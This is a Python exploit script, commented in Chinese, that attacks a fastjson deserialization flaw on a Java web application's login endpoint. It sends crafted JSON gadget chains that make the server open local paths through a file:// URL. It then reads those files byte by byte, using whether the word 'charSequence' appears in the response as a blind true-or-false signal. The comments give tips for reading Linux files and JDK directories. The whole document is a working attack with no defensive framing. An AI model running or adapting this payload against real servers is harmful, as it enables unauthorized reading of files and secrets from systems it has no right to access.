import requests
import json

url = "http://10.30.0.248:8080/login"

#码表可按照实际修改，例如探测jdk目录一般文件名为小写
#asciis = [10,32,45,46,47,48,49,50,51,52,53,54,55,56,57,91,92,95,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122] #针对linux下正常文件夹或文件读取，去除了一些文件名下不常见的字符，且全为小写 
asciis = [10,32,45,46,47,48,49,50,51,52,53,54,55,56,57,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,95,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122] #针对linux下正常文件夹或文件读取，去除了一些文件名下不常见的字符，且包含大小写 
# asciis = [10,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122,123,124,125,126] #所有可见字符


data1 = """
{
    "abc": {
				"@type": "java.lang.AutoCloseable",
        "@type": "org.apache.commons.io.input.BOMInputStream",
        "delegate": {
            "@type": "org.apache.commons.io.input.ReaderInputStream",
            "reader": {
                "@type": "jdk.nashorn.api.scripting.URLReader",
                "url": "file:///usr/local/tomcat/apache-tomcat-8.5.95/webapps/ROOT"
            },
            "charsetName": "UTF-8",
            "bufferSize": 1024
        },
        "boms": [
            {
                "charsetName": "UTF-8",
                "bytes": [
"""  

data2 = """
                ]
            }
        ]
    },
    "address": {
        "@type": "java.lang.AutoCloseable",
        "@type": "org.apache.commons.io.input.CharSequenceReader",
        "charSequence": {
            "@type": "java.lang.String"{"$ref":"$.abc.BOM[0]"},
            "start": 0,
            "end": 0
        }
    }
}
"""
proxies = {
    'http': '127.0.0.1:8080',
}

header = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0",
    "Content-Type": "application/json; charset=utf-8"
}

def byte2str(bytes):
    file_str = ""
    for i in file_byte:
        file_str += chr(int(i))
    print("【" + file_str + "】")

file_byte = []
for i in range(0,30):  # 需要读取多长自己定义，但一次性不要太长，建议分多次读取
    for i in asciis:
        file_byte.append(str(i))
        req = requests.post(url=url,data=data1+','.join(file_byte)+data2,headers=header)
        text = req.text
        
        if "charSequence" not in text:
            file_byte.pop()
    byte2str(file_byte) 
print(file_byte)        



